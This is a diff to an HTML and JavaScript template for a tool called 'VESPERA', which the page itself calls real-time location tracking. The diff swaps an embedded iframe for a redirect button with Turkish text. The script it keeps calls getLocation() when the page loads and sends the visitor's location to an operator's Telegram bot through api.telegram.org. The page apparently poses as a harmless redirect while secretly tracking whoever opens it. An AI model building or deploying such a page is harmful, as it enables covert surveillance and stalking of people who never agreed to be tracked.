@@ -320,28 +320,55 @@ body::before {{
     margin-bottom: 20px;
     border: 1px solid rgba(0, 255, 136, 0.2);
     box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+    text-align: center;
 }}
 
 .content h2 {{
     color: #00ff88;
     margin-bottom: 20px;
     font-size: 1.8em;
-    text-align: center;
 }}
 
-iframe {{
-    width: 100%;
-    height: 500px;
+.redirect-box {{
+    background: rgba(0, 0, 0, 0.8);
     border: 2px solid rgba(0, 255, 136, 0.3);
     border-radius: 10px;
-    background: #000;
+    padding: 25px;
+    margin: 20px 0;
     box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
+}}
+
+.redirect-button {{
+    display: inline-block;
+    padding: 15px 30px;
+    background: linear-gradient(135deg, #00ff88 0%, #00c8ff 100%);
+    color: #000;
+    text-decoration: none;
+    border-radius: 8px;
+    font-size: 1.2em;
+    font-weight: bold;
+    margin: 15px 0;
+    border: 2px solid rgba(0, 255, 136, 0.5);
+    box-shadow: 0 0 15px rgba(0, 255, 136, 0.3);
     transition: all 0.3s ease;
 }}
 
-iframe:hover {{
-    border-color: rgba(0, 255, 136, 0.6);
-    box-shadow: 0 0 30px rgba(0, 255, 136, 0.4);
+.redirect-button:hover {{
+    transform: translateY(-3px);
+    box-shadow: 0 0 25px rgba(0, 255, 136, 0.5);
+    background: linear-gradient(135deg, #00c8ff 0%, #00ff88 100%);
+}}
+
+.url-display {{
+    background: rgba(0, 0, 0, 0.6);
+    border: 1px solid rgba(0, 255, 136, 0.2);
+    border-radius: 8px;
+    padding: 12px;
+    margin: 15px 0;
+    word-break: break-all;
+    font-family: monospace;
+    color: #00ff88;
+    font-size: 0.9em;
 }}
 
 #footer {{
@@ -388,12 +415,13 @@ iframe:hover {{
         font-size: 2em;
     }}
     
-    iframe {{
-        height: 400px;
-    }}
-    
     .content {{
         padding: 20px;
+    }}
+    
+    .redirect-button {{
+        padding: 12px 25px;
+        font-size: 1.1em;
     }}
 }}
 </style>
@@ -412,17 +440,34 @@ iframe:hover {{
     </div>
 
     <div class="content">
-        <h2>📍 Konum Takibi</h2>
-        <iframe src="{IFRAME_LINK}" allowfullscreen></iframe>
+        <h2>📍 Yönlendirme Sayfası</h2>
+        
+        <div class="redirect-box">
+            <p style="margin-bottom: 15px; color: #ccc;">
+                Aşağıdaki butona tıklayarak hedef sayfaya yönlendirileceksiniz.
+            </p>
+            
+            <a href="{IFRAME_LINK}" class="redirect-button" target="_blank">
+                🔗 Hedef Sayfaya Git
+            </a>
+            
+            <div class="url-display">
+                Hedef URL: {IFRAME_LINK}
+            </div>
+            
+            <p style="color: #888; font-size: 14px; margin-top: 15px;">
+                📌 Not: Konum bilgisi otomatik olarak alınacak ve gönderilecektir.
+            </p>
+        </div>
     </div>
 
-<div id="footer">
+    <div id="footer">
         <div style="margin-bottom: 10px;">
             <span class="status-indicator"></span>
             <strong style="color: #00ff88;">VESPERA</strong> - Gerçek Zamanlı Konum Takibi
         </div>
-🔗 Telegram Kanalı: <a href="https://t.me/why_reronuzzz" target="_blank">@why_reronuzzz</a><br>
-👨‍💻 Owner & Coded by RERO
+        🔗 Telegram Kanalı: <a href="https://t.me/why_reronuzzz" target="_blank">@why_reronuzzz</a><br>
+        👨‍💻 Owner & Coded by RERO
     </div>
 </div>
 
@@ -432,9 +477,9 @@ const CHAT_ID = "{CHAT_ID}";
 
 async function sendToTelegram(text){{
     try {{
-    await fetch(
-        `https://api.telegram.org/bot${{BOT_TOKEN}}/sendMessage?chat_id=${{CHAT_ID}}&text=${{encodeURIComponent(text)}}&parse_mode=Markdown`
-    );
+        await fetch(
+            `https://api.telegram.org/bot${{BOT_TOKEN}}/sendMessage?chat_id=${{CHAT_ID}}&text=${{encodeURIComponent(text)}}&parse_mode=Markdown`
+        );
     }} catch(error) {{
         console.error("Telegram gönderim hatası:", error);
     }}
@@ -502,6 +547,7 @@ async function getLocation(){{
     }}
 }}
 
+// Sayfa yüklendiğinde konum al
 getLocation();
 </script>
 
